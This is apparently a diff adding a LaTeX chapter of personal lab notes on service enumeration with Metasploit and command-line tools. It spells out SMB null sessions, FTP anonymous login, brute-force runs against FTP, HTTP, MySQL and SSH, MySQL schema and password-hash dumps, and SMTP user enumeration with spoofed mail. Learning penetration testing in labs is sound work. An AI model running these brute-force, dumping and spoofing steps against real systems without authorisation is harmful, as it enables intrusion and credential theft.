@@ -1,0 +1,346 @@
+\chapter{Service Enumeration}
+\label{ch:enumeration}
+
+Enumeration is the deep dive into discovered services. Where scanning says
+``port 445 is open'', enumeration says ``SMB is running, signing is disabled,
+the OS is Windows Server 2016, and these shares are accessible''. That
+difference is what turns a scan into an attack plan.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Enumeration Workflow --- General Pattern}
+\label{sec:enum_workflow}
+
+Every service I enumerate follows the same pattern inside Metasploit:
+
+\begin{termbox}
+service postgresql start && msfconsole
+workspace -a project_name
+setg RHOSTS target_ip
+setg RHOST  target_ip
+db_nmap -sS -sV target_ip    # Save scan to DB
+hosts                         # Confirm target registered
+services                      # Review open ports
+\end{termbox}
+
+Then for each open service I work through the relevant auxiliary modules.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SMB Enumeration}
+\label{sec:smb_enum}
+
+\begin{notebox}
+SMB theory, authentication, and full exploitation is covered in
+Chapter~\ref{ch:smb} on page~\pageref{ch:smb}. This section covers enumeration
+commands only.
+\end{notebox}
+
+
+
+\begin{termbox}
+# Manual SMB enumeration
+smbclient -L \\\\target_ip\\                    # List shares (guest)
+smbclient -L \\\\target_ip\\ -N                 # Null session attempt
+smbclient -L demo.ine.local -N                  # Named target
+rpcclient -U "" -N demo.ine.local               # Anonymous RPC connection
+nmap --script smb-os-discovery.nse -p 445 ip   # OS via SMB
+
+# Metasploit SMB enumeration
+use auxiliary/scanner/smb/smb_version
+run
+use auxiliary/scanner/smb/smb_enumshares
+run
+use auxiliary/scanner/smb/smb_enumusers
+run
+\end{termbox}
+
+\begin{notebox}
+
+\screenshot{assets/images/Screenshot_2025-08-04_at_8.02.00_AM.png}{SMB enumeration showing shares and version information}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{FTP Enumeration}
+\label{sec:ftp_enum}
+
+FTP (port 21) is interesting for two reasons: anonymous login and known exploits
+against specific server versions (e.g., ProFTPD).
+
+\begin{termbox}
+# Check for anonymous login
+ftp target_ip
+# When prompted for username: anonymous
+# When prompted for password: (blank or any email)
+
+# Nmap FTP scripts
+nmap -sV -p 21 --script ftp-anon,ftp-bounce target_ip
+
+# Metasploit FTP version scanner
+use auxiliary/scanner/ftp/ftp_version
+set RHOSTS target_ip
+run
+
+# Metasploit anonymous login check
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS target_ip
+run
+
+# Brute-force FTP credentials
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS target_ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+\end{termbox}
+
+\begin{notebox}[After FTP brute-force]
+FTP may not respond for a short time after brute-forcing completes. This is normal
+--- the server may have rate limiting or connection throttling. Wait a moment and
+retry.
+\end{notebox}
+
+\begin{termbox}
+# If ProFTPD is running, search for version-specific exploits
+search ProFTPD
+# Replace version with the actual version found from nmap -sV
+\end{termbox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{HTTP / Web Server Enumeration}
+\label{sec:http_enum}
+
+\begin{termbox}
+# Metasploit HTTP enumeration workflow
+use auxiliary/scanner/http/http_version
+show options
+set RHOSTS target_ip
+set SSL false     # or true if HTTPS
+run
+
+# Directory scanning
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS target_ip
+set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+
+# Brute-force HTTP basic auth
+use auxiliary/scanner/http/http_login
+set RHOSTS target_ip
+set AUTH_URI /secure/          # Path found during enumeration
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+\end{termbox}
+
+\begin{notebox}
+\ic{robots.txt} is always worth checking manually. It tells search engines
+what not to index --- which means it often reveals hidden directories, admin
+panels, and upload locations. Check \ic{http://target/robots.txt} before any
+automated scan.
+\end{notebox}
+
+\screenshot{assets/images/Screenshot_2025-08-04_at_8.05.26_AM.png}{HTTP directory enumeration finding hidden paths}
+
+\screenshot{assets/images/Screenshot_2025-08-04_at_8.06.15_AM.png}{robots.txt revealing interesting directories on the target}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{MySQL Enumeration}
+\label{sec:mysql_enum}
+
+MySQL on port 3306 is a significant finding. Unauthenticated access or weak
+root credentials can expose the entire database.
+
+\end{notebox}
+
+\begin{termbox}
+# Metasploit MySQL modules (run after finding port 3306 open)
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS target_ip
+run
+
+# Brute-force MySQL root password
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS target_ip
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+
+# Once logged in --- enumerate the database
+use auxiliary/admin/mysql/mysql_sql
+set PASSWORD found_password
+set USERNAME root
+run
+
+# Dump schema
+use auxiliary/scanner/mysql/mysql_schemadump
+set PASSWORD found_password
+set USERNAME root
+run
+
+# Dump password hashes
+use auxiliary/scanner/mysql/mysql_hashdump
+set PASSWORD found_password
+set USERNAME root
+run
+
+# File enumeration
+use auxiliary/scanner/mysql/mysql_file_enum
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+
+# Manual login after finding credentials
+mysql -h target_ip -u root -p
+# Then inside mysql:
+# show databases;
+# use database_name;
+# show tables;
+# select * from table_name;
+\end{termbox}
+
+\begin{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SSH Enumeration}
+\label{sec:ssh_enum}
+
+\begin{termbox}
+# Check SSH version
+nmap -sV -p 22 target_ip
+
+# Enumerate valid usernames (SSH user enum)
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS target_ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+
+# Brute-force SSH
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS target_ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set VERBOSE false
+run
+
+# If credentials found, access session
+sessions
+sessions -i session_number
+
+# Inside session
+ls
+whoami
+/bin/bash -i     # Upgrade to interactive bash if ls returns nothing
+find / -name "flag"
+cat /flag
+\end{termbox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SMTP Enumeration}
+\label{sec:smtp_enum}
+
+SMTP (port 25) can be used to enumerate valid email addresses using the
+\ic{VRFY} command, which many mail servers respond to.
+
+\begin{termbox}
+# Find which port SMTP is running on
+nmap -sV --script banner target_ip
+
+# Connect manually
+nc target_ip 25
+
+# SMTP commands
+HELO attacker.xyz
+EHLO attacker.xyz
+VRFY admin@openmailbox.xyz          # Check if user exists
+VRFY commander@openmailbox.xyz
+
+# Send fake email via telnet (demonstration only)
+telnet target_ip 25
+HELO attacker.xyz
+mail from: admin@attacker.xyz
+rcpt to: root@openmailbox.xyz
+data
+Subject: Test
+Hello from attacker.
+.
+
+# Command-line user enumeration
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t target_ip
+
+# Metasploit SMTP enumeration
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS target_ip
+run
+
+# Send fake email using sendemail
+sendemail -f admin@attacker.xyz -t root@openmailbox.xyz \
+  -s target_ip -u "Subject" -m "Message body" -o tls=no
+\end{termbox}
+
+\begin{notebox}
+The \ic{data} command initiates the email body in telnet. The session ends with
+a line containing only a dot (\ic{.}). This terminates the DATA block.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Reviewing Results in Metasploit}
+\label{sec:msf_results}
+
+After running multiple enumeration modules, Metasploit's database holds all
+findings. These commands retrieve them:
+
+\begin{termbox}
+hosts      # All discovered hosts
+services   # All discovered services and ports
+loot       # Captured data (hashes, files, etc.)
+creds      # Credentials found during enumeration
+vulns      # Identified vulnerabilities
+\end{termbox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Learning Output}
+
+\begin{takebox}
+\textbf{What I Learned}
+\begin{itemize}
+  \item Enumeration is where the attack plan actually forms. Scanning finds ports;
+        enumeration tells me how to use them.
+  \item The Metasploit database (\ic{hosts}, \ic{services}, \ic{creds}) is
+        underused by beginners. Feeding everything through db\_nmap and running
+        enumeration modules means I have a searchable record of everything.
+  \item MySQL with root and a weak password is more common than it should be.
+        Always try \ic{root} with blank password and common passwords first.
+\end{itemize}
+
+\textbf{Enumeration Mindset --- What to Check First}
+\begin{enumerate}
+  \item Check open ports against known services
+  \item For each service: version, anonymous access, known CVEs
+  \item FTP: anonymous login attempt first
+  \item HTTP: \ic{robots.txt}, directory scan, basic auth locations
+  \item SMB: null session, share listing, OS discovery
+  \item MySQL: root with no password or common password
+  \item SSH: user enumeration, then targeted brute-force
+  \item SMTP: \ic{VRFY} command to confirm valid users
+\end{enumerate}
+
+\textbf{Common Mistakes}
+\begin{itemize}
+  \item Skipping anonymous login checks --- it still works surprisingly often
+  \item Running brute-force on every service immediately ---
+        start with version detection and known exploits first
+  \item Not using \ic{VERBOSE false} during brute-force --- the output
+        of failed attempts makes it hard to spot the success line
+  \item Not saving credentials found during enumeration before moving on
+\end{itemize}
+
+\textbf{Real-World Impact}
+\begin{itemize}
+  \item Anonymous FTP access: free file download/upload on a server
+  \item SMTP user enumeration: valid email list for phishing
+  \item MySQL root access: full database dump, credential extraction
+  \item SSH credentials: direct persistent access to the system
+\end{itemize}
+\end{takebox}
+
+\end{notebox}
